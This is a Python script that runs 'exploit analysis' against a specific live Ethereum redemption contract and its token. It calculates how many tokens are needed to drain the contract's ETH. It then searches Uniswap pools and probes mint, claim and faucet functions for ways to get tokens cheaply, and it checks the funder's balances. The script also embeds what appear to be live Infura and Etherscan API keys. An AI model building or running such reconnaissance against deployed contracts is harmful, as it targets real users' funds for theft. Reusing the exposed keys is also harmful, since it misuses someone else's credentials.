#!/usr/bin/env python3
"""
Deep analysis of RedemptionContract exploit potential
The contract allows redeeming tokens for ETH at rate 2410
Can we acquire tokens cheaply and arbitrage?
"""
import json
import subprocess

RPC = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c"
ETHERSCAN_API = "5UWN6DNT7UZCEJYNE3J6FCVAWH4QJW255K"

def rpc_call(method, params):
    payload = {"jsonrpc": "2.0", "method": method, "params": params, "id": 1}
    cmd = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
           "-d", json.dumps(payload), RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    try:
        return json.loads(result.stdout)
    except:
        return None

def eth_call(to, data):
    result = rpc_call("eth_call", [{"to": to, "data": data}, "latest"])
    if result and 'result' in result:
        return result['result']
    return None

def get_balance(addr):
    result = rpc_call("eth_getBalance", [addr, "latest"])
    if result and 'result' in result:
        return int(result['result'], 16) / 1e18
    return 0

def get_source(addr):
    url = f"https://api.etherscan.io/v2/api?chainid=1&module=contract&action=getsourcecode&address={addr}&apikey={ETHERSCAN_API}"
    result = subprocess.run(["curl", "-s", url], capture_output=True, text=True)
    try:
        data = json.loads(result.stdout)
        if data.get("status") == "1" and data.get("result"):
            return data["result"][0]
    except:
        pass
    return None

REDEMPTION_CONTRACT = "0x899f9a0440face1397a1ee1e3f6bf3580a6633d1"
TOKEN_ADDRESS = "0x02b9806a64cb05f02aa8dcc1c178b88159a61304"
FUNDER = "0x8f12fe64d2e9fea29def7106868fe7f43bf999a9"
EXCHANGE_RATE = 2410

print("=" * 80)
print("REDEMPTION CONTRACT EXPLOIT ANALYSIS")
print("=" * 80)

print(f"\nRedemption Contract: {REDEMPTION_CONTRACT}")
print(f"ETH Balance: {get_balance(REDEMPTION_CONTRACT):.4f} ETH")
print(f"Token: {TOKEN_ADDRESS}")
print(f"Exchange Rate: {EXCHANGE_RATE} tokens per 1 ETH")
print(f"Funder: {FUNDER}")

# Analyze the token
print("\n" + "=" * 60)
print("TOKEN ANALYSIS")
print("=" * 60)

token_source = get_source(TOKEN_ADDRESS)
if token_source:
    print(f"Token Name: {token_source.get('ContractName', 'Unknown')}")
    src = token_source.get("SourceCode", "")
    print(f"Source Length: {len(src)} chars")
    if src:
        print("\n--- TOKEN SOURCE (first 3000 chars) ---")
        print(src[:3000])
        print("--- END ---")

# Get token info
print("\n[Token State]")

# name()
name = eth_call(TOKEN_ADDRESS, "0x06fdde03")
if name and name != "0x":
    try:
        # Decode string
        name_len = int(name[66:130], 16)
        name_bytes = bytes.fromhex(name[130:130+name_len*2])
        print(f"  name(): {name_bytes.decode('utf-8')}")
    except:
        pass

# symbol()
symbol = eth_call(TOKEN_ADDRESS, "0x95d89b41")
if symbol and symbol != "0x":
    try:
        sym_len = int(symbol[66:130], 16)
        sym_bytes = bytes.fromhex(symbol[130:130+sym_len*2])
        print(f"  symbol(): {sym_bytes.decode('utf-8')}")
    except:
        pass

# totalSupply()
total_supply = eth_call(TOKEN_ADDRESS, "0x18160ddd")
if total_supply and total_supply != "0x":
    ts = int(total_supply, 16)
    print(f"  totalSupply(): {ts} ({ts/1e18:.4f})")

# decimals()
decimals = eth_call(TOKEN_ADDRESS, "0x313ce567")
if decimals and decimals != "0x":
    d = int(decimals, 16)
    print(f"  decimals(): {d}")

# Balance of redemption contract
balance_of_redemption = eth_call(TOKEN_ADDRESS,
    "0x70a08231" + "000000000000000000000000" + REDEMPTION_CONTRACT[2:])
if balance_of_redemption and balance_of_redemption != "0x":
    bal = int(balance_of_redemption, 16)
    print(f"  balanceOf(RedemptionContract): {bal}")

# Check token owner or admin
owner = eth_call(TOKEN_ADDRESS, "0x8da5cb5b")
if owner and owner != "0x" and len(owner) >= 66:
    owner_addr = "0x" + owner[26:]
    print(f"  owner(): {owner_addr}")

# CALCULATE EXPLOIT ECONOMICS
print("\n" + "=" * 60)
print("EXPLOIT ECONOMICS")
print("=" * 60)

redemption_eth = get_balance(REDEMPTION_CONTRACT)
print(f"\nRedemption Contract ETH: {redemption_eth:.4f} ETH")

# To drain all ETH, need: redemption_eth * EXCHANGE_RATE tokens
tokens_needed = redemption_eth * EXCHANGE_RATE
print(f"Tokens needed to drain: {tokens_needed:,.0f} tokens")

# If token has 18 decimals
tokens_needed_wei = tokens_needed * 1e18
print(f"Tokens needed (wei): {tokens_needed_wei:.0f}")

# Check if tokens are tradeable anywhere
print("\n[Market Analysis]")
print("Need to find where these tokens trade...")

# Check common DEX pairs
# Uniswap V2: getReserves on potential pair
# Factory: 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
uniswap_factory = "0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f"

# getPair(token, WETH)
WETH = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
get_pair_data = "0xe6a43905" + "000000000000000000000000" + TOKEN_ADDRESS[2:] + "000000000000000000000000" + WETH[2:]
pair_result = eth_call(uniswap_factory, get_pair_data)
if pair_result and pair_result != "0x":
    pair_addr = "0x" + pair_result[26:]
    if pair_addr != "0x0000000000000000000000000000000000000000":
        print(f"  Uniswap V2 Pair: {pair_addr}")

        # Get reserves
        reserves = eth_call(pair_addr, "0x0902f1ac")
        if reserves and reserves != "0x":
            r0 = int(reserves[2:66], 16)
            r1 = int(reserves[66:130], 16)
            print(f"    reserve0: {r0}")
            print(f"    reserve1: {r1}")
    else:
        print("  No Uniswap V2 pair exists")

# Check Uniswap V3
print("\n  Checking Uniswap V3...")
# Would need to check specific pools

# ALTERNATIVE: Can we mint/obtain tokens directly?
print("\n" + "=" * 60)
print("TOKEN ACQUISITION VECTORS")
print("=" * 60)

# Check if token has public mint
mint_funcs = {
    "mint(uint256)": "0xa0712d68",
    "mint(address,uint256)": "0x40c10f19",
    "claim()": "0x4e71d92d",
    "faucet()": "0xde5f72fd",
}

for func, sel in mint_funcs.items():
    data = sel
    if "uint256" in func:
        data = sel + "0000000000000000000000000000000000000000000000000000000000000001"
    if "address" in func:
        data = sel + "0000000000000000000000000000000000000000000000000000000000000001"
        data = data[:10+64] + "0000000000000000000000000000000000000000000000000000000000000001"

    result = rpc_call("eth_estimateGas", [{"to": TOKEN_ADDRESS, "data": data, "from": "0x0000000000000000000000000000000000000001"}])
    if result and 'result' in result:
        gas = int(result['result'], 16)
        print(f"  [+] {func} callable - gas: {gas}")
    elif result and 'error' in result:
        err = result['error'].get('message', '')[:50]
        print(f"  [-] {func}: {err}")

# Check funder balance of token
print("\n[Funder Analysis]")
print(f"Funder: {FUNDER}")
funder_token_bal = eth_call(TOKEN_ADDRESS,
    "0x70a08231" + "000000000000000000000000" + FUNDER[2:])
if funder_token_bal and funder_token_bal != "0x":
    bal = int(funder_token_bal, 16)
    print(f"  Funder token balance: {bal} ({bal/1e18:.4f})")

funder_eth = get_balance(FUNDER)
print(f"  Funder ETH balance: {funder_eth:.4f} ETH")

print("\n" + "=" * 80)
print("ANALYSIS COMPLETE")
print("=" * 80)
